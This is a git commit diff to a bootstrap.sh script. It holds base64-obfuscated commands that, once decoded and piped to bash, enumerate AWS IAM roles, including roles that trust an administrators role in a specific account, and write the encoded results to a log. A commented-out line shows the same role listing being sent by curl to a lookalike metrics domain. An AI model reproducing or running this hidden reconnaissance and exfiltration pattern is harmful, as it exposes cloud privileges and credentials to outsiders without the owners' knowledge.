426fba5d633f2ae98acc769071e6adf65edace81
svendev045 <126712757+svendev045@users.noreply.github.com>
2023-03-02 11:59:16 -0800

    Update bootstrap.sh

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 #curl -XGET http://api.datadog-metrics.net/aad2936f-2d7f-41f6-8a24-05896d958998/$(base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGVzIC0tcXVlcnkgIlJvbGVzWypdLltSb2xlTmFtZSwgQXJuXSI= | bash))
-base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGVzIC0tcXVlcnkgJ1JvbGVzWz9Bc3N1bWVSb2xlUG9saWN5RG9jdW1lbnQuU3RhdGVtZW50W10uUHJpbmNpcGFsLkFXUz09YGFybjphd3M6aWFtOjo3ODU5MzgyOTM5MTM6cm9sZS9ueWRpZy1hZG1pbmlzdHJhdG9yc2BdLlJvbGVOYW1lJw== | bash) > data.log && cat data.log
+base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGVzIC0tcXVlcnkgJ1JvbGVzWz9Bc3N1bWVSb2xlUG9saWN5RG9jdW1lbnQuU3RhdGVtZW50W10uUHJpbmNpcGFsLkFXUz09YGFybjphd3M6aWFtOjoyNDAzMzYzMDg0ODk6cm9sZS9ueWRpZy1hZG1pbmlzdHJhdG9yc2BdLlJvbGVOYW1lJw== | bash) > data.log && cat data.log
